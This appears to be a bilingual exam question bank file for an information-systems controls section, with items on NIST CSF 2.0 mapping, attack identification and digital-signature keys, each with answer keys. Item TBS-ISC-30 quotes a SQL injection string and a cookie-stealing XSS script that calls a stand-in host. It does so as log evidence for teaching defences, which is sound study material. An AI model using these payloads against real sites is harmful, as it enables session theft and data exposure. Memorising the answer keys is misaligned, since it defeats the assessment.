// ISC のTBS追加(NIST CSF 2.0・攻撃と軽減統制・暗号鍵・ファイアウォール・脆弱性優先順位・インシデント対応・プライバシー・アクセスレビュー)

CPA.tbs({
  id: "TBS-ISC-29", section: "ISC", chapter: "ISC-02", title: "NIST CSF 2.0の機能・カテゴリーへの統制の対応付け",
  scenario: `<p>Harlow Medical Supply, Inc. is aligning its control inventory with the <b>NIST Cybersecurity Framework (CSF) 2.0</b>. The CISO prepared the following excerpt and asks you to assign each control to the single most appropriate CSF 2.0 category.</p>
<p><b>Exhibit — Control inventory (excerpt)</b></p>
<table><tr><th>No.</th><th>Control description</th></tr>
<tr><td>C1</td><td>Before signing a contract, Procurement requires critical vendors to complete a security questionnaire and provide a SOC 2 Type 2 report; contracts include breach-notification and right-to-audit clauses.</td></tr>
<tr><td>C2</td><td>IT maintains a configuration management database (CMDB) listing all hardware, software, and data flows, with an owner and criticality rating for each item.</td></tr>
<tr><td>C3</td><td>Remote access to the ERP requires multifactor authentication, and access rights are granted on a least-privilege basis.</td></tr>
<tr><td>C4</td><td>A security operations center uses a SIEM to monitor network traffic and endpoint activity 24/7 for anomalous behavior.</td></tr>
<tr><td>C5</td><td>After an incident is contained, systems are restored from immutable backups in the sequence set by the recovery plan, and the integrity of restored data is verified before return to production.</td></tr>
<tr><td>C6</td><td>Lessons learned from incidents and annual tabletop exercises are documented and used to update the security program and response plans.</td></tr>
<tr><td>C7</td><td>The board's audit committee reviews quarterly results of the cybersecurity risk management strategy and directs adjustments when performance falls short.</td></tr></table>
<p class="ja">Harlow Medical Supply社は統制一覧を<b>NISTサイバーセキュリティ・フレームワーク(CSF)2.0</b>に整合させている。CISOが作成した抜粋(C1:重要ベンダーとの契約前にセキュリティ質問票とSOC 2 Type 2報告書を要求し、契約に侵害通知条項と監査権条項を入れる/C2:CMDBで全ハードウェア・ソフトウェア・データフローを所有者と重要度付きで管理/C3:ERPへのリモートアクセスに多要素認証を要求し、最小権限で権限付与/C4:SOCがSIEMでネットワークとエンドポイントを24時間365日監視/C5:封じ込め後、復旧計画の順序に従いイミュータブルバックアップから復元し、本番復帰前にデータの完全性を検証/C6:インシデントと年次机上演習の教訓を文書化し、プログラムと対応計画の更新に用いる/C7:取締役会の監査委員会がサイバーリスク管理戦略の結果を四半期ごとにレビューし、不十分な場合は修正を指示)について、最も適切なCSF 2.0のカテゴリーを1つ選べ。</p>`,
  rows: [
    { label: "C1(ベンダーのセキュリティ評価と契約条項)", type: "select", options: ["GV.SC Cybersecurity Supply Chain Risk Management", "ID.RA Risk Assessment", "PR.DS Data Security", "RS.CO Incident Response Reporting and Communication", "GV.PO Policy"], answer: "GV.SC Cybersecurity Supply Chain Risk Management" },
    { label: "C2(CMDBによる資産管理)", type: "select", options: ["PR.PS Platform Security", "ID.AM Asset Management", "GV.OC Organizational Context", "DE.CM Continuous Monitoring", "ID.RA Risk Assessment"], answer: "ID.AM Asset Management" },
    { label: "C3(多要素認証と最小権限)", type: "select", options: ["PR.AT Awareness and Training", "PR.AA Identity Management, Authentication, and Access Control", "PR.DS Data Security", "DE.AE Adverse Event Analysis", "GV.RR Roles, Responsibilities, and Authorities"], answer: "PR.AA Identity Management, Authentication, and Access Control" },
    { label: "C4(SIEMによる常時監視)", type: "select", options: ["DE.CM Continuous Monitoring", "RS.AN Incident Analysis", "PR.PS Platform Security", "ID.AM Asset Management", "RS.MA Incident Management"], answer: "DE.CM Continuous Monitoring" },
    { label: "C5(バックアップからの復元と完全性検証)", type: "select", options: ["RS.MI Incident Mitigation", "PR.IR Technology Infrastructure Resilience", "RC.RP Incident Recovery Plan Execution", "RC.CO Incident Recovery Communication", "PR.DS Data Security"], answer: "RC.RP Incident Recovery Plan Execution" },
    { label: "C6(教訓の文書化と計画の更新)", type: "select", options: ["ID.IM Improvement", "RS.AN Incident Analysis", "GV.OV Oversight", "RC.CO Incident Recovery Communication", "PR.AT Awareness and Training"], answer: "ID.IM Improvement" },
    { label: "C7(監査委員会による戦略結果のレビュー)", type: "select", options: ["GV.RM Risk Management Strategy", "GV.OV Oversight", "ID.RA Risk Assessment", "GV.OC Organizational Context", "DE.AE Adverse Event Analysis"], answer: "GV.OV Oversight" },
    { label: "Number of the seven controls that fall under the Govern (GV) function(7つの統制のうちガバナンス(GV)機能に属する数)", type: "num", answer: 2 },
  ],
  explain: `<p>CSF 2.0の6機能は Govern(統治)・Identify(識別)・Protect(防御)・Detect(検知)・Respond(対応)・Recover(復旧)である。</p>
<p>① C1:サプライヤーの評価や契約上のセキュリティ要求は、2.0で Govern に新設された GV.SC(サプライチェーン・リスク管理)に属する。</p>
<p>② C2:ハードウェア・ソフトウェア・データフローの棚卸と重要度付けは ID.AM(資産管理)である。</p>
<p>③ C3:認証(MFA)とアクセス権の付与・最小権限は PR.AA(ID管理・認証・アクセス制御)である。</p>
<p>④ C4:異常を見つけるための継続的な監視は DE.CM である。検知した事象の分析は DE.AE だが、本統制は監視そのものである。</p>
<p>⑤ C5:封じ込め後に復旧計画に従ってシステムを復元し、完全性を確認するのは RC.RP(復旧計画の実行)である。RS.MI は封じ込め・根絶であり段階が異なる。</p>
<p>⑥ C6:CSF 2.0では改善(Improvement)は Identify 機能の ID.IM に置かれた(1.1では Respond/Recover の各機能に Improvements があった)。</p>
<p>⑦ C7:リスク管理戦略の結果をレビューし調整するのは GV.OV(監督)である。リスク選好や戦略の策定自体は GV.RM である。</p>
<p>⑧ GVに属するのは C1(GV.SC)と C7(GV.OV)の2つ。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-30", section: "ISC", chapter: "ISC-02", title: "インシデント記録の攻撃手法の特定と最適な軽減統制",
  scenario: `<p>Brightwater Logistics' security team logged four events during October 2026. For each event, identify the attack type and the control that would <b>most directly</b> prevent or mitigate it.</p>
<p><b>Exhibit 1 — Security event log (summarized)</b></p>
<table><tr><th>Event</th><th>Description</th></tr>
<tr><td>E1</td><td>An AP clerk received an email from "ceo@brightwater-logistcs.com" (note the misspelled domain) asking her to urgently change a supplier's bank account and release a $186,000 payment before the CEO's flight. The email contained no attachment or link.</td></tr>
<tr><td>E2</td><td>The customer portal's web server log shows the string <code>' OR '1'='1' --</code> submitted in the username field, followed by a response containing every customer record.</td></tr>
<tr><td>E3</td><td>The identity provider recorded 4,800 failed logins over six hours: each of 1,600 user accounts was tried with only the passwords "Autumn2026!", "Welcome1", and "Password123". Attempts came from rotating IP addresses, and no account reached the five-attempt lockout threshold.</td></tr>
<tr><td>E4</td><td>A product review submitted on the public website contained <code>&lt;script&gt;fetch('https://x.example/c?'+document.cookie)&lt;/script&gt;</code>. The review was saved and executed in the browsers of other visitors who viewed the page.</td></tr></table>
<p><b>Exhibit 2 — Candidate controls</b>: out-of-band verification of payment changes; parameterized queries with server-side input validation; context-aware output encoding with a content security policy; phishing-resistant multifactor authentication with risk-based login throttling; full-disk encryption; network segmentation.</p>
<p class="ja">Brightwater Logistics社のセキュリティチームは2026年10月に4件の事象を記録した。E1:買掛金担当者に綴りを誤ったドメインの「CEO」からメールが届き、搭乗前に至急、仕入先の銀行口座を変更して186,000ドルを支払うよう依頼された(添付もリンクもない)。E2:顧客ポータルのユーザー名欄に <code>' OR '1'='1' --</code> が入力され、全顧客レコードが返された。E3:6時間で4,800件のログイン失敗。1,600のアカウントそれぞれに3種類のよくあるパスワードのみが試され、IPアドレスは変動し、5回ロックアウトの閾値に達したアカウントはない。E4:公開サイトの製品レビューに cookie を外部送信するスクリプトが含まれ、保存されたうえ閲覧した他の訪問者のブラウザで実行された。各事象の攻撃手法と、最も直接的に防止・軽減する統制(Exhibit 2の候補)を選べ。</p>`,
  rows: [
    { label: "E1 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "Business email compromise (spoofed executive)" },
    { label: "E1 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Out-of-band verification of payment changes" },
    { label: "E2 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "SQL injection" },
    { label: "E2 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Parameterized queries with server-side input validation" },
    { label: "E3 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "Password spraying" },
    { label: "E3 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Phishing-resistant MFA with risk-based login throttling" },
    { label: "E4 — attack type(攻撃手法)", type: "select", options: ["Business email compromise (spoofed executive)", "SQL injection", "Stored cross-site scripting (XSS)", "Password spraying", "Credential stuffing", "Man-in-the-middle"], answer: "Stored cross-site scripting (XSS)" },
    { label: "E4 — best control(最適な統制)", type: "select", options: ["Out-of-band verification of payment changes", "Parameterized queries with server-side input validation", "Context-aware output encoding with a content security policy", "Phishing-resistant MFA with risk-based login throttling", "Full-disk encryption", "Network segmentation"], answer: "Context-aware output encoding with a content security policy" },
  ],
  explain: `<p>① E1:マルウェアもリンクもなく、類似ドメインで経営者になりすまし、急ぎの送金や口座変更を求める典型的なビジネスメール詐欺(BEC)である。技術的なフィルタをすり抜けるため、既知の連絡先への折り返し電話など、メールとは別経路での確認(アウト・オブ・バンド確認)が最も直接的な統制となる。</p>
<p>② E2:入力値がSQL文の一部として解釈され、WHERE句が常に真になって全件が返されている。SQLインジェクションである。入力をデータとして扱うパラメータ化クエリ(プリペアドステートメント)とサーバー側の入力検証が根本的な対策である。</p>
<p>③ E3:少数のよくあるパスワードを多数のアカウントに試し、アカウントあたりの試行回数をロックアウト閾値未満に抑えている。パスワードスプレーである。漏えいしたID・パスワードの組を使うクレデンシャルスタッフィングとは異なる。パスワードが当たっても侵入できないフィッシング耐性のあるMFAと、送信元・リスクに基づくログイン抑制が最適である。</p>
<p>④ E4:スクリプトがサーバーに保存され、閲覧者のブラウザで実行されている。格納型(持続型)XSSである。出力時の文脈に応じたエンコード(エスケープ)とコンテンツセキュリティポリシー(CSP)が直接の対策である。全ディスク暗号化やネットワーク分離はいずれの攻撃にも直接対応しない。</p>`,
});

CPA.tbs({
  id: "TBS-ISC-31", section: "ISC", chapter: "ISC-02", title: "電子署名とハイブリッド暗号で使われる鍵の特定",
  scenario: `<p>Ana Ruiz, treasurer of Corvane Co., must send a signed, confidential loan amendment to Ben Okafor, the lender's counsel, over the internet. Both parties hold X.509 certificates issued by a trusted certificate authority (CA). The company's secure-messaging tool follows these steps:</p>
<p><b>Exhibit 1 — Process</b></p>
<table><tr><th>Step</th><th>Action</th></tr>
<tr><td>1</td><td>Compute a SHA-256 hash of the document.</td></tr>
<tr><td>2</td><td>Encrypt the hash to create a digital signature.</td></tr>
<tr><td>3</td><td>Generate a random AES-256 session key and encrypt the document and signature with it.</td></tr>
<tr><td>4</td><td>Encrypt the session key so that only Ben can recover it.</td></tr>
<tr><td>5</td><td>Ben recovers the session key, decrypts the document, and verifies the signature.</td></tr></table>
<p><b>Exhibit 2 — Ben's verification result</b></p>
<table><tr><th>Item</th><th>Value (first 8 hex characters)</th></tr>
<tr><td>Hash recovered from Ana's signature</td><td>9f2c41ab…</td></tr>
<tr><td>Hash Ben computes on the decrypted document</td><td>9f2c41ae…</td></tr></table>
<p>Separately, Corvane's IT manager is comparing key management approaches for its <b>50</b> employees who exchange confidential files with one another.</p>
<p class="ja">Corvane社の財務担当Ana Ruizは、署名付きで機密の融資契約変更書を貸手の弁護士Ben Okaforにインターネット経由で送る。両者は信頼できる認証局(CA)発行のX.509証明書を持つ。手順は、1:文書のSHA-256ハッシュを計算、2:ハッシュを暗号化して電子署名を作成、3:ランダムなAES-256セッション鍵を生成し文書と署名を暗号化、4:Benだけが復元できるようセッション鍵を暗号化、5:Benがセッション鍵を復元し、文書を復号して署名を検証、である。Benの検証では、署名から復元したハッシュは 9f2c41ab…、復号した文書から計算したハッシュは 9f2c41ae… であった。別途、IT責任者は機密ファイルを相互にやり取りする従業員<b>50</b>名の鍵管理方式を比較している。</p>`,
  rows: [
    { label: "Key used in Step 2 to create the signature(手順2で署名作成に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ana's private key" },
    { label: "Key used in Step 4 to encrypt the session key(手順4でセッション鍵の暗号化に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ben's public key" },
    { label: "Key Ben uses to recover the session key(Benがセッション鍵の復元に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ben's private key" },
    { label: "Key Ben uses to verify the signature(Benが署名の検証に使う鍵)", type: "select", options: ["Ana's private key", "Ana's public key", "Ben's private key", "Ben's public key", "The AES session key"], answer: "Ana's public key" },
    { label: "Conclusion from Exhibit 2(Exhibit 2からの結論)", type: "select", options: ["Signature is valid; the document is authentic and unaltered", "The document was altered after signing (or corrupted); reject it", "The document is authentic, but confidentiality was lost", "Ben used the wrong private key; the result is inconclusive"], answer: "The document was altered after signing (or corrupted); reject it" },
    { label: "Role of the CA in this process(このプロセスにおけるCAの役割)", type: "select", options: ["Holds escrow copies of each user's private key to decrypt messages", "Binds each public key to its owner's verified identity by signing a certificate", "Generates the AES session key for each message", "Computes the hash value used in the signature"], answer: "Binds each public key to its owner's verified identity by signing a certificate" },
    { label: "Unique keys needed if the 50 employees use only symmetric keys, one per pair(50名が対ごとに共通鍵のみを使う場合の鍵数)", type: "num", answer: 1225 },
    { label: "Keys needed if each of the 50 employees has an asymmetric key pair(50名が各自公開鍵ペアを持つ場合の鍵の総数)", type: "num", answer: 100 },
  ],
  explain: `<p>① 署名は送信者が自分の<b>秘密鍵</b>でハッシュを暗号化して作る。これにより送信者の認証と否認防止が得られる。</p>
<p>② セッション鍵は受信者の<b>公開鍵</b>で暗号化する。対応する秘密鍵を持つBenだけが復元できるため機密性が確保される(大量データは高速なAESで暗号化し、鍵の受け渡しだけ公開鍵暗号を使うハイブリッド方式)。</p>
<p>③ Benは自分の秘密鍵でセッション鍵を復号する。</p>
<p>④ 署名の検証には署名者Anaの公開鍵を使い、署名からハッシュを取り出す。</p>
<p>⑤ 取り出したハッシュ(…41ab)と再計算したハッシュ(…41ae)が一致しない。ハッシュはわずかな変更でも値が変わるため、署名後に文書が改ざん(または破損)されたことを示し、完全性が確認できない。受け入れずに再送を求める。</p>
<p>⑥ CAは本人確認を行ったうえで、公開鍵と所有者を結び付ける証明書に電子署名する。秘密鍵の預託やセッション鍵の生成は役割ではない。</p>
<p>⑦ 共通鍵方式では全ての組合せに鍵が必要:n(n−1)/2 = 50×49÷2 = 1,225。</p>
<p>⑧ 公開鍵方式では1人1ペア:2n = 2×50 = 100。</p>`,
});
